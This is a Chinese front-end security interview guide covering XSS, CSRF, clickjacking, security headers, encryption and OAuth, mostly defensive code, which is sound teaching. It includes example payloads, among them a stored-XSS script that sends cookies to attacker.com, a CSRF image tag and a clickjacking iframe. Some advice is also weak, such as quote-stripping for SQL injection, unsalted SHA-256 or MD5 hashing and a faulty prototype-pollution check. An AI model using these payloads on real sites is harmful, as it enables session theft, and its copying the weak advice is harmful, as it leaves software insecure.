# 前端安全面试题

## XSS 攻击

### 1. 什么是 XSS？如何防范？

**答案：**

XSS（Cross-Site Scripting）跨站脚本攻击，攻击者在网页中注入恶意脚本。

**类型：**

**1. 反射型 XSS：**
```
攻击链接：
https://example.com/search?keyword=<script>alert('XSS')</script>

服务端直接将参数返回到页面：
<div>搜索结果：<script>alert('XSS')</script></div>
```

**2. 存储型 XSS：**
```
攻击者在评论中输入：
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>

服务端存储后，其他用户访问时执行
```

**3. DOM 型 XSS：**
```javascript
// 不安全的代码
const hash = location.hash.substring(1);
document.getElementById('content').innerHTML = hash;

// 攻击链接
https://example.com/#<img src=x onerror="alert('XSS')">
```

**防范措施：**

```javascript
// 1. 输入过滤/转义
function escapeHtml(str) {
  const escapeMap = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  return str.replace(/[&<>"'/]/g, char => escapeMap[char]);
}

// 2. 使用安全的 API
// 不好
element.innerHTML = userInput;
// 好
element.textContent = userInput;

// 3. CSP（Content Security Policy）
// HTTP 响应头
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'

// meta 标签
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'">

// 4. HttpOnly Cookie
Set-Cookie: session=abc123; HttpOnly; Secure

// 5. 框架自动转义
// React 默认转义
<div>{userInput}</div>

// Vue 默认转义
<div>{{ userInput }}</div>

// 6. 富文本过滤
// 使用 DOMPurify
import DOMPurify from 'dompurify';
const clean = DOMPurify.sanitize(dirty);
```

---

## CSRF 攻击

### 2. 什么是 CSRF？如何防范？

**答案：**

CSRF（Cross-Site Request Forgery）跨站请求伪造，攻击者诱导用户在已登录的网站上执行非预期操作。

**攻击流程：**
```
1. 用户登录 bank.com，Cookie 保存会话
2. 用户访问恶意网站 evil.com
3. evil.com 页面包含：
   <img src="https://bank.com/transfer?to=attacker&amount=1000">
4. 浏览器自动携带 bank.com 的 Cookie 发送请求
5. 转账成功
```

**防范措施：**

```javascript
// 1. CSRF Token
// 服务端生成 Token，存在 session 中
// 前端表单携带 Token
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="random-token">
  ...
</form>

// AJAX 请求携带 Token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken
  },
  body: JSON.stringify(data)
});

// 2. SameSite Cookie
Set-Cookie: session=abc123; SameSite=Strict
// Strict: 完全禁止跨站发送
// Lax: 允许安全的跨站请求（GET 导航）
// None: 允许跨站（需要 Secure）

// 3. 验证 Referer/Origin
// 服务端检查请求来源
const origin = req.headers.origin || req.headers.referer;
if (!isValidOrigin(origin)) {
  return res.status(403).send('Invalid origin');
}

// 4. 双重 Cookie 验证
// 1. 服务端设置 Cookie
// 2. 前端从 Cookie 读取值，放入请求头
// 3. 服务端验证 Cookie 和请求头中的值是否一致
document.cookie = 'csrf_token=random-token';
fetch('/api', {
  headers: {
    'X-CSRF-Token': getCookie('csrf_token')
  }
});

// 5. 关键操作二次验证
// 敏感操作要求输入密码或验证码
```

---

## 点击劫持

### 3. 什么是点击劫持？如何防范？

**答案：**

点击劫持（Clickjacking）通过透明的 iframe 覆盖在页面上，诱导用户点击。

**攻击方式：**
```html
<!-- 攻击者页面 -->
<style>
  iframe {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0;  /* 透明 */
    z-index: 999;
  }
</style>

<button>点击领取奖品</button>
<iframe src="https://bank.com/transfer?to=attacker"></iframe>
```

**防范措施：**

```javascript
// 1. X-Frame-Options 响应头
X-Frame-Options: DENY           // 禁止任何嵌套
X-Frame-Options: SAMEORIGIN     // 只允许同源嵌套
X-Frame-Options: ALLOW-FROM uri // 允许指定来源

// 2. CSP frame-ancestors
Content-Security-Policy: frame-ancestors 'none'
Content-Security-Policy: frame-ancestors 'self'
Content-Security-Policy: frame-ancestors https://trusted.com

// 3. JavaScript 防护
// 检测是否被嵌套
if (top !== self) {
  top.location = self.location;
}

// 更安全的方式
<style id="antiClickjack">
  body { display: none !important; }
</style>
<script>
  if (self === top) {
    document.getElementById('antiClickjack').remove();
  } else {
    top.location = self.location;
  }
</script>
```

---

## 其他安全问题

### 4. SQL 注入（前端相关）

**答案：**

虽然 SQL 注入主要是后端问题，但前端也需要注意：

```javascript
// 前端参数化请求
// 不要在前端拼接 SQL 相关的字符串

// 输入验证
function validateInput(input) {
  // 移除危险字符
  return input.replace(/['";\-\-]/g, '');
}

// 使用参数化请求
fetch('/api/users?' + new URLSearchParams({
  name: userInput  // 自动编码
}));
```

---

### 5. 中间人攻击（MITM）

**答案：**

**防范措施：**

```javascript
// 1. 使用 HTTPS
// 所有通信加密

// 2. HSTS（HTTP Strict Transport Security）
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

// 3. 证书固定（Certificate Pinning）
// 在应用中固定证书指纹

// 4. 敏感数据加密
// 即使传输层被攻破，数据仍然加密
const encryptedData = CryptoJS.AES.encrypt(
  sensitiveData,
  secretKey
).toString();
```

---

### 6. 前端数据安全

**答案：**

```javascript
// 1. 敏感数据不存储在前端
// 不要存储密码、密钥等

// 2. localStorage/sessionStorage 安全
// 不存储敏感信息
// 对敏感数据加密
const encrypted = CryptoJS.AES.encrypt(data, key).toString();
localStorage.setItem('data', encrypted);

// 3. 清除敏感数据
window.addEventListener('beforeunload', () => {
  sessionStorage.clear();
});

// 4. 防止控制台注入
// 生产环境禁用 console
if (process.env.NODE_ENV === 'production') {
  console.log = () => {};
  console.warn = () => {};
  console.error = () => {};
}

// 5. 防止源码泄露
// 代码混淆
// Source Map 不上传生产环境

// 6. API 密钥安全
// 不在前端暴露 API 密钥
// 通过后端代理请求
```

---

### 7. 安全响应头配置

**答案：**

```http
# 1. Content-Security-Policy
# 限制资源加载来源
Content-Security-Policy: default-src 'self';
  script-src 'self' 'nonce-random123';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';

# 2. X-Content-Type-Options
# 防止 MIME 类型嗅探
X-Content-Type-Options: nosniff

# 3. X-Frame-Options
# 防止点击劫持
X-Frame-Options: DENY

# 4. X-XSS-Protection
# 启用浏览器 XSS 过滤
X-XSS-Protection: 1; mode=block

# 5. Referrer-Policy
# 控制 Referer 头发送
Referrer-Policy: strict-origin-when-cross-origin

# 6. Permissions-Policy
# 控制浏览器功能
Permissions-Policy: geolocation=(), camera=(), microphone=()

# 7. Strict-Transport-Security
# 强制 HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

---

### 8. 前端加密

**答案：**

```javascript
// 1. 使用 Web Crypto API
async function generateKey() {
  return await crypto.subtle.generateKey(
    { name: 'AES-GCM', length: 256 },
    true,
    ['encrypt', 'decrypt']
  );
}

async function encrypt(key, data) {
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const encoded = new TextEncoder().encode(data);

  const encrypted = await crypto.subtle.encrypt(
    { name: 'AES-GCM', iv },
    key,
    encoded
  );

  return { iv, encrypted };
}

async function decrypt(key, iv, encrypted) {
  const decrypted = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv },
    key,
    encrypted
  );

  return new TextDecoder().decode(decrypted);
}

// 2. 密码哈希
async function hashPassword(password) {
  const encoded = new TextEncoder().encode(password);
  const hashBuffer = await crypto.subtle.digest('SHA-256', encoded);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// 3. 使用 crypto-js 库
import CryptoJS from 'crypto-js';

// AES 加密
const encrypted = CryptoJS.AES.encrypt(message, secretKey).toString();
const decrypted = CryptoJS.AES.decrypt(encrypted, secretKey).toString(CryptoJS.enc.Utf8);

// MD5 哈希
const hash = CryptoJS.MD5(message).toString();

// SHA256 哈希
const hash256 = CryptoJS.SHA256(message).toString();
```

---

### 9. OAuth 和 SSO 安全

**答案：**

```javascript
// OAuth 2.0 授权码流程

// 1. 重定向到授权服务器
const authUrl = new URL('https://auth.example.com/authorize');
authUrl.searchParams.set('response_type', 'code');
authUrl.searchParams.set('client_id', 'your-client-id');
authUrl.searchParams.set('redirect_uri', 'https://your-app.com/callback');
authUrl.searchParams.set('scope', 'openid profile email');
authUrl.searchParams.set('state', generateRandomState()); // CSRF 防护
authUrl.searchParams.set('code_challenge', generateCodeChallenge()); // PKCE
authUrl.searchParams.set('code_challenge_method', 'S256');

window.location.href = authUrl.toString();

// 2. 回调处理
async function handleCallback() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');
  const state = params.get('state');

  // 验证 state
  if (state !== sessionStorage.getItem('oauth_state')) {
    throw new Error('State mismatch');
  }

  // 交换 token
  const response = await fetch('https://auth.example.com/token', {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({
      grant_type: 'authorization_code',
      code,
      redirect_uri: 'https://your-app.com/callback',
      client_id: 'your-client-id',
      code_verifier: sessionStorage.getItem('code_verifier') // PKCE
    })
  });

  const tokens = await response.json();
  // 安全存储 tokens
}

// PKCE 防护
function generateCodeVerifier() {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return base64UrlEncode(array);
}

async function generateCodeChallenge(verifier) {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return base64UrlEncode(new Uint8Array(hash));
}
```

---

### 10. 安全开发最佳实践

**答案：**

```javascript
// 1. 输入验证
function validateEmail(email) {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regex.test(email);
}

function validatePhone(phone) {
  const regex = /^1[3-9]\d{9}$/;
  return regex.test(phone);
}

// 2. 输出编码
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// 3. 安全的 URL 处理
function isValidUrl(url) {
  try {
    const parsed = new URL(url);
    return ['http:', 'https:'].includes(parsed.protocol);
  } catch {
    return false;
  }
}

// 4. 防止原型污染
const safeObject = Object.create(null);
// 或使用 Map
const safeMap = new Map();

// 解析 JSON 时验证
function safeParse(json) {
  const obj = JSON.parse(json);
  if (obj.__proto__ || obj.constructor) {
    throw new Error('Prototype pollution attempt');
  }
  return obj;
}

// 5. 依赖安全
// 定期检查依赖漏洞
npm audit
npm audit fix

// 使用锁文件
package-lock.json

// 6. 安全配置
// .env 文件不提交
// 敏感配置从环境变量读取
const apiKey = process.env.API_KEY;

// 7. 日志安全
// 不记录敏感信息
function sanitizeLog(data) {
  const { password, token, ...safe } = data;
  return safe;
}

// 8. 错误处理
// 不暴露详细错误信息给用户
try {
  await riskyOperation();
} catch (error) {
  console.error(error); // 内部日志
  showUserError('操作失败，请重试'); // 用户提示
}
```
